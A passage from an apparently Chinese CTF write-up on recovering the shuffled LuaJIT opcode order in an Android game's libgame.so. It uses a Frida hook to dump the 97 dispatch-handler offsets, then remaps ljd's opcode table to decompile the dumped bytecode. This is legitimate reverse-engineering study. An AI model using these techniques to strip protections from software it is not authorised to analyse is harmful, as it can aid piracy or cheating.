class="built_in">GG_OFS</span>(g))</span><br></pre></td></tr></table></figure>

<p>即 <strong>GG_State</strong> 结构体的 g 字段与 dispatch 字段的地址差值，该值可在 IDA 中查看，为 0xF30：</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230410215934466.png" alt="image-20230410215934466"></p>
<p>因此可以进一步理解三条汇编：首先通过GL寄存器加上0xf30找到dispatch数组，该数组每一项（8字节）都是处理例程的指针，元素下标位该处理例程的opcode，在此基础上加上opcode*8得到当前ocpode处理例程。</p>
<p>从lj_bc.h可以知道该版本下的luajit有97种opcode：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BCDEF(_) \</span></span><br><span class="line"><span class="meta">  <span class="comment">/* Comparison ops. ORDER OPR. */</span> \</span></span><br><span class="line"><span class="meta">  _(ISLT,	var,	___,	var,	lt) \</span></span><br><span class="line"><span class="meta">  _(ISGE,	var,	___,	var,	lt) \</span></span><br><span class="line"><span class="meta">  _(ISLE,	var,	___,	var,	le) \</span></span><br><span class="line"><span class="meta">  _(ISGT,	var,	___,	var,	le) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  _(ISEQV,	var,	___,	var,	eq) \</span></span><br><span class="line"><span class="meta">  _(ISNEV,	var,	___,	var,	eq) \</span></span><br><span class="line"><span class="meta">  _(ISEQS,	var,	___,	str,	eq) \</span></span><br><span class="line"><span class="meta">  _(ISNES,	var,	___,	str,	eq) \</span></span><br><span class="line"><span class="meta">  _(ISEQN,	var,	___,	num,	eq) \</span></span><br><span class="line"><span class="meta">  _(ISNEN,	var,	___,	num,	eq) \</span></span><br><span class="line"><span class="meta">  _(ISEQP,	var,	___,	pri,	eq) \</span></span><br><span class="line"><span class="meta">  _(ISNEP,	var,	___,	pri,	eq) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  <span class="comment">/* Unary test and copy ops. */</span> \</span></span><br><span class="line"><span class="meta">  _(ISTC,	dst,	___,	var,	___) \</span></span><br><span class="line"><span class="meta">  _(ISFC,	dst,	___,	var,	___) \</span></span><br><span class="line"><span class="meta">  _(IST,	___,	___,	var,	___) \</span></span><br><span class="line"><span class="meta">  _(ISF,	___,	___,	var,	___) \</span></span><br><span class="line"><span class="meta">  _(ISTYPE,	var,	___,	lit,	___) \</span></span><br><span class="line"><span class="meta">  _(ISNUM,	var,	___,	lit,	___) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  <span class="comment">/* Unary ops. */</span> \</span></span><br><span class="line"><span class="meta">  _(MOV,	dst,	___,	var,	___) \</span></span><br><span class="line"><span class="meta">  _(NOT,	dst,	___,	var,	___) \</span></span><br><span class="line"><span class="meta">  _(UNM,	dst,	___,	var,	unm) \</span></span><br><span class="line"><span class="meta">  _(LEN,	dst,	___,	var,	len) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  <span class="comment">/* Binary ops. ORDER OPR. VV last, POW must be next. */</span> \</span></span><br><span class="line"><span class="meta">  _(ADDVN,	dst,	var,	num,	add) \</span></span><br><span class="line"><span class="meta">  _(SUBVN,	dst,	var,	num,	sub) \</span></span><br><span class="line"><span class="meta">  _(MULVN,	dst,	var,	num,	mul) \</span></span><br><span class="line"><span class="meta">  _(DIVVN,	dst,	var,	num,	div) \</span></span><br><span class="line"><span class="meta">  _(MODVN,	dst,	var,	num,	mod) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  _(ADDNV,	dst,	var,	num,	add) \</span></span><br><span class="line"><span class="meta">  _(SUBNV,	dst,	var,	num,	sub) \</span></span><br><span class="line"><span class="meta">  _(MULNV,	dst,	var,	num,	mul) \</span></span><br><span class="line"><span class="meta">  _(DIVNV,	dst,	var,	num,	div) \</span></span><br><span class="line"><span class="meta">  _(MODNV,	dst,	var,	num,	mod) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  _(ADDVV,	dst,	var,	var,	add) \</span></span><br><span class="line"><span class="meta">  _(SUBVV,	dst,	var,	var,	sub) \</span></span><br><span class="line"><span class="meta">  _(MULVV,	dst,	var,	var,	mul) \</span></span><br><span class="line"><span class="meta">  _(DIVVV,	dst,	var,	var,	div) \</span></span><br><span class="line"><span class="meta">  _(MODVV,	dst,	var,	var,	mod) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  _(POW,	dst,	var,	var,	pow) \</span></span><br><span class="line"><span class="meta">  _(CAT,	dst,	rbase,	rbase,	concat) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  <span class="comment">/* Constant ops. */</span> \</span></span><br><span class="line"><span class="meta">  _(KSTR,	dst,	___,	str,	___) \</span></span><br><span class="line"><span class="meta">  _(KCDATA,	dst,	___,	cdata,	___) \</span></span><br><span class="line"><span class="meta">  _(KSHORT,	dst,	___,	lits,	___) \</span></span><br><span class="line"><span class="meta">  _(KNUM,	dst,	___,	num,	___) \</span></span><br><span class="line"><span class="meta">  _(KPRI,	dst,	___,	pri,	___) \</span></span><br><span class="line"><span class="meta">  _(KNIL,	base,	___,	base,	___) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  <span class="comment">/* Upvalue and function ops. */</span> \</span></span><br><span class="line"><span class="meta">  _(UGET,	dst,	___,	uv,	___) \</span></span><br><span class="line"><span class="meta">  _(USETV,	uv,	___,	var,	___) \</span></span><br><span class="line"><span class="meta">  _(USETS,	uv,	___,	str,	___) \</span></span><br><span class="line"><span class="meta">  _(USETN,	uv,	___,	num,	___) \</span></span><br><span class="line"><span class="meta">  _(USETP,	uv,	___,	pri,	___) \</span></span><br><span class="line"><span class="meta">  _(UCLO,	rbase,	___,	jump,	___) \</span></span><br><span class="line"><span class="meta">  _(FNEW,	dst,	___,	func,	gc) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  <span class="comment">/* Table ops. */</span> \</span></span><br><span class="line"><span class="meta">  _(TNEW,	dst,	___,	lit,	gc) \</span></span><br><span class="line"><span class="meta">  _(TDUP,	dst,	___,	tab,	gc) \</span></span><br><span class="line"><span class="meta">  _(GGET,	dst,	___,	str,	index) \</span></span><br><span class="line"><span class="meta">  _(GSET,	var,	___,	str,	newindex) \</span></span><br><span class="line"><span class="meta">  _(TGETV,	dst,	var,	var,	index) \</span></span><br><span class="line"><span class="meta">  _(TGETS,	dst,	var,	str,	index) \</span></span><br><span class="line"><span class="meta">  _(TGETB,	dst,	var,	lit,	index) \</span></span><br><span class="line"><span class="meta">  _(TGETR,	dst,	var,	var,	index) \</span></span><br><span class="line"><span class="meta">  _(TSETV,	var,	var,	var,	newindex) \</span></span><br><span class="line"><span class="meta">  _(TSETS,	var,	var,	str,	newindex) \</span></span><br><span class="line"><span class="meta">  _(TSETB,	var,	var,	lit,	newindex) \</span></span><br><span class="line"><span class="meta">  _(TSETM,	base,	___,	num,	newindex) \</span></span><br><span class="line"><span class="meta">  _(TSETR,	var,	var,	var,	newindex) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  <span class="comment">/* Calls and vararg handling. T = tail call. */</span> \</span></span><br><span class="line"><span class="meta">  _(CALLM,	base,	lit,	lit,	call) \</span></span><br><span class="line"><span class="meta">  _(CALL,	base,	lit,	lit,	call) \</span></span><br><span class="line"><span class="meta">  _(CALLMT,	base,	___,	lit,	call) \</span></span><br><span class="line"><span class="meta">  _(CALLT,	base,	___,	lit,	call) \</span></span><br><span class="line"><span class="meta">  _(ITERC,	base,	lit,	lit,	call) \</span></span><br><span class="line"><span class="meta">  _(ITERN,	base,	lit,	lit,	call) \</span></span><br><span class="line"><span class="meta">  _(VARG,	base,	lit,	lit,	___) \</span></span><br><span class="line"><span class="meta">  _(ISNEXT,	base,	___,	jump,	___) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  <span class="comment">/* Returns. */</span> \</span></span><br><span class="line"><span class="meta">  _(RETM,	base,	___,	lit,	___) \</span></span><br><span class="line"><span class="meta">  _(RET,	rbase,	___,	lit,	___) \</span></span><br><span class="line"><span class="meta">  _(RET0,	rbase,	___,	lit,	___) \</span></span><br><span class="line"><span class="meta">  _(RET1,	rbase,	___,	lit,	___) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  <span class="comment">/* Loops and branches. I/J = interp/JIT, I/C/L = init/call/loop. */</span> \</span></span><br><span class="line"><span class="meta">  _(FORI,	base,	___,	jump,	___) \</span></span><br><span class="line"><span class="meta">  _(JFORI,	base,	___,	jump,	___) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  _(FORL,	base,	___,	jump,	___) \</span></span><br><span class="line"><span class="meta">  _(IFORL,	base,	___,	jump,	___) \</span></span><br><span class="line"><span class="meta">  _(JFORL,	base,	___,	lit,	___) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  _(ITERL,	base,	___,	jump,	___) \</span></span><br><span class="line"><span class="meta">  _(IITERL,	base,	___,	jump,	___) \</span></span><br><span class="line"><span class="meta">  _(JITERL,	base,	___,	lit,	___) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  _(LOOP,	rbase,	___,	jump,	___) \</span></span><br><span class="line"><span class="meta">  _(ILOOP,	rbase,	___,	jump,	___) \</span></span><br><span class="line"><span class="meta">  _(JLOOP,	rbase,	___,	lit,	___) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  _(JMP,	rbase,	___,	jump,	___) \</span></span><br><span class="line"><span class="meta">  \</span></span><br><span class="line"><span class="meta">  <span class="comment">/* Function headers. I/J = interp/JIT, F/V/C = fixarg/vararg/C func. */</span> \</span></span><br><span class="line"><span class="meta">  _(FUNCF,	rbase,	___,	___,	___) \</span></span><br><span class="line"><span class="meta">  _(IFUNCF,	rbase,	___,	___,	___) \</span></span><br><span class="line"><span class="meta">  _(JFUNCF,	rbase,	___,	lit,	___) \</span></span><br><span class="line"><span class="meta">  _(FUNCV,	rbase,	___,	___,	___) \</span></span><br><span class="line"><span class="meta">  _(IFUNCV,	rbase,	___,	___,	___) \</span></span><br><span class="line"><span class="meta">  _(JFUNCV,	rbase,	___,	lit,	___) \</span></span><br><span class="line"><span class="meta">  _(FUNCC,	rbase,	___,	___,	___) \</span></span><br><span class="line"><span class="meta">  _(FUNCCW,	rbase,	___,	___,	___)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据上述规则，我们可以用hook找到这些在so中的处理例程的地址：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> output = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> lib_base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libgame.so&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(lib_base.<span class="title function_">add</span>(<span class="number">0xACFEF0</span>), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!output) &#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="variable constant_">GL</span> = <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x22</span>;</span><br><span class="line">            <span class="keyword">var</span> dispatch = <span class="variable constant_">GL</span>.<span class="title function_">add</span>(<span class="number">0xF30</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">97</span>; ++i) &#123;</span><br><span class="line">                <span class="keyword">var</span> prog_ptr = dispatch.<span class="title function_">add</span>(i * <span class="number">8</span>).<span class="title function_">readPointer</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(prog_ptr.<span class="title function_">sub</span>(lib_base));</span><br><span class="line">            &#125;</span><br><span class="line">            output = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>) &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>得到所有地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xacdaf0</span></span><br><span class="line"><span class="number">0xacdb70</span></span><br><span class="line"><span class="number">0xacdbf0</span></span><br><span class="line"><span class="number">0xacdc70</span></span><br><span class="line"><span class="number">0xacdcf0</span></span><br><span class="line"><span class="number">0xacdd74</span></span><br><span class="line"><span class="number">0xacddf4</span></span><br><span class="line"><span class="number">0xacde44</span></span><br><span class="line"><span class="number">0xacde94</span></span><br><span class="line"><span class="number">0xacdf20</span></span><br><span class="line"><span class="number">0xacdfac</span></span><br><span class="line"><span class="number">0xacdff0</span></span><br><span class="line"><span class="number">0xace034</span></span><br><span class="line"><span class="number">0xace060</span></span><br><span class="line"><span class="number">0xace08c</span></span><br><span class="line"><span class="number">0xace0b0</span></span><br><span class="line"><span class="number">0xace0d0</span></span><br><span class="line"><span class="number">0xace0f0</span></span><br><span class="line"><span class="number">0xace120</span></span><br><span class="line"><span class="number">0xace160</span></span><br><span class="line"><span class="number">0xace1a0</span></span><br><span class="line"><span class="number">0xace1d8</span></span><br><span class="line"><span class="number">0xace210</span></span><br><span class="line"><span class="number">0xace234</span></span><br><span class="line"><span class="number">0xace258</span></span><br><span class="line"><span class="number">0xace278</span></span><br><span class="line"><span class="number">0xace2a8</span></span><br><span class="line"><span class="number">0xace2ec</span></span><br><span class="line"><span class="number">0xace334</span></span><br><span class="line"><span class="number">0xace348</span></span><br><span class="line"><span class="number">0xace3f0</span></span><br><span class="line"><span class="number">0xace458</span></span><br><span class="line"><span class="number">0xace4c8</span></span><br><span class="line"><span class="number">0xace534</span></span><br><span class="line"><span class="number">0xace5a0</span></span><br><span class="line"><span class="number">0xace614</span></span><br><span class="line"><span class="number">0xace65c</span></span><br><span class="line"><span class="number">0xace6d0</span></span><br><span class="line"><span class="number">0xace73c</span></span><br><span class="line"><span class="number">0xace7a8</span></span><br><span class="line"><span class="number">0xace81c</span></span><br><span class="line"><span class="number">0xace864</span></span><br><span class="line"><span class="number">0xace8d8</span></span><br><span class="line"><span class="number">0xace944</span></span><br><span class="line"><span class="number">0xace9b0</span></span><br><span class="line"><span class="number">0xacea24</span></span><br><span class="line"><span class="number">0xacea6c</span></span><br><span class="line"><span class="number">0xaceae0</span></span><br><span class="line"><span class="number">0xaceb28</span></span><br><span class="line"><span class="number">0xaceb74</span></span><br><span class="line"><span class="number">0xaceba8</span></span><br><span class="line"><span class="number">0xacec18</span></span><br><span class="line"><span class="number">0xacec80</span></span><br><span class="line"><span class="number">0xacecb4</span></span><br><span class="line"><span class="number">0xacece8</span></span><br><span class="line"><span class="number">0xaced24</span></span><br><span class="line"><span class="number">0xaced6c</span></span><br><span class="line"><span class="number">0xacedcc</span></span><br><span class="line"><span class="number">0xacee20</span></span><br><span class="line"><span class="number">0xacee38</span></span><br><span class="line"><span class="number">0xacee50</span></span><br><span class="line"><span class="number">0xaceedc</span></span><br><span class="line"><span class="number">0xacef70</span></span><br><span class="line"><span class="number">0xacefdc</span></span><br><span class="line"><span class="number">0xacf024</span></span><br><span class="line"><span class="number">0xacf0d4</span></span><br><span class="line"><span class="number">0xacf1d0</span></span><br><span class="line"><span class="number">0xacf260</span></span><br><span class="line"><span class="number">0xacf2f4</span></span><br><span class="line"><span class="number">0xacf35c</span></span><br><span class="line"><span class="number">0xacf36c</span></span><br><span class="line"><span class="number">0xacf3b4</span></span><br><span class="line"><span class="number">0xacf3c0</span></span><br><span class="line"><span class="number">0xacf47c</span></span><br><span class="line"><span class="number">0xacf4cc</span></span><br><span class="line"><span class="number">0xacf570</span></span><br><span class="line"><span class="number">0xacf62c</span></span><br><span class="line"><span class="number">0xacf6a4</span></span><br><span class="line"><span class="number">0xacf734</span></span><br><span class="line"><span class="number">0xacf7d0</span></span><br><span class="line"><span class="number">0xacf7ec</span></span><br><span class="line"><span class="number">0xacf878</span></span><br><span class="line"><span class="number">0xacf8fc</span></span><br><span class="line"><span class="number">0xacf918</span></span><br><span class="line"><span class="number">0xacf94c</span></span><br><span class="line"><span class="number">0xacf97c</span></span><br><span class="line"><span class="number">0xacf998</span></span><br><span class="line"><span class="number">0xacf9b0</span></span><br><span class="line"><span class="number">0xacf9d4</span></span><br><span class="line"><span class="number">0xacf9f4</span></span><br><span class="line"><span class="number">0xacfa10</span></span><br><span class="line"><span class="number">0xacfa50</span></span><br><span class="line"><span class="number">0xacfa80</span></span><br><span class="line"><span class="number">0xacfa80</span></span><br><span class="line"><span class="number">0xacfb04</span></span><br><span class="line"><span class="number">0xacfb08</span></span><br><span class="line"><span class="number">0xacfb50</span></span><br></pre></td></tr></table></figure>

<p>接下来就是对照源码vm_arm64.dasc，在ida中标出97个地址对应的opcode。具体就是在源码build_ins函数中找到和汇编一样的case，然后修改函数名为opcode名称，这样我们就将 opcode 的顺序找到了，下一步就该对之前 dump 下来的 luac64 文件进行反编译了。</p>
<p>综上所述，总结一下：该apk是通过cocos2d引擎lua开发的游戏，这个题的lua通过luajit加载器加载到了so文件中，而且这个luajit加载器的源码被改过。所以想反编译就必须找到正确的opcode顺序，可以通过hook，找到每个opcode处理地址，然后手动对比dump出的地址处的汇编和源码汇编并修改函数名称，再用idapython dump出对应顺序，最后修改 <code>ljd/rawdump/luajit/v2_1/luajit_opcode.py</code><strong>_OPCODES</strong>元组，ljd&#x2F;bytecode&#x2F;instructions.py处的指令和ljd&#x2F;ast&#x2F;builder.py指令解析。</p>
<p>该指令方法如下：</p>
<p>1、打开<code>ljd/rawdump/luajit/v2_1/luajit_opcode.py</code>，修改_OPCODES如下：</p>
<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">0x0</span><span class="punctuation">,</span> instructions.ISLT)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x1</span><span class="punctuation">,</span> instructions.ISGE)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x2</span><span class="punctuation">,</span> instructions.ISLE)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x3</span><span class="punctuation">,</span> instructions.ISGT)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x4</span><span class="punctuation">,</span> instructions.ISEQV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x5</span><span class="punctuation">,</span> instructions.ISNEV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x6</span><span class="punctuation">,</span> instructions.ISEQS)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x7</span><span class="punctuation">,</span> instructions.ISNES)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x8</span><span class="punctuation">,</span> instructions.ISEQN)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x9</span><span class="punctuation">,</span> instructions.ISNEN)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0xa</span><span class="punctuation">,</span> instructions.ISEQP)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0xb</span><span class="punctuation">,</span> instructions.ISNEP)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0xc</span><span class="punctuation">,</span> instructions.KSTR)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0xd</span><span class="punctuation">,</span> instructions.KCDATA)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0xe</span><span class="punctuation">,</span> instructions.KSHORT)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0xf</span><span class="punctuation">,</span> instructions.KNUM)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x10</span><span class="punctuation">,</span> instructions.KPRI)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x11</span><span class="punctuation">,</span> instructions.KNIL)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x12</span><span class="punctuation">,</span> instructions.ISTC)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x13</span><span class="punctuation">,</span> instructions.ISFC)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x14</span><span class="punctuation">,</span> instructions.IST)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x15</span><span class="punctuation">,</span> instructions.ISF)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x16</span><span class="punctuation">,</span> instructions.ISTYPE)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x17</span><span class="punctuation">,</span> instructions.ISNUM)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x18</span><span class="punctuation">,</span> instructions.MOV)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x19</span><span class="punctuation">,</span> instructions.NOT)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x1a</span><span class="punctuation">,</span> instructions.UNM)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x1b</span><span class="punctuation">,</span> instructions.LEN)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x1c</span><span class="punctuation">,</span> instructions.RETM)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x1d</span><span class="punctuation">,</span> instructions.RET)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x1e</span><span class="punctuation">,</span> instructions.RET0)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x1f</span><span class="punctuation">,</span> instructions.RET1)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x20</span><span class="punctuation">,</span> instructions.ADDVN)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x21</span><span class="punctuation">,</span> instructions.SUBVN)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x22</span><span class="punctuation">,</span> instructions.MULVN)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x23</span><span class="punctuation">,</span> instructions.DIVVN)<span class="punctuation">,</span></span><br><span class="line">(<span class="number">0x24</span><span class="punctuation">,</span> instructions.MODVN)<span class="punctuation">,</span></span><br><span class="line">(<span 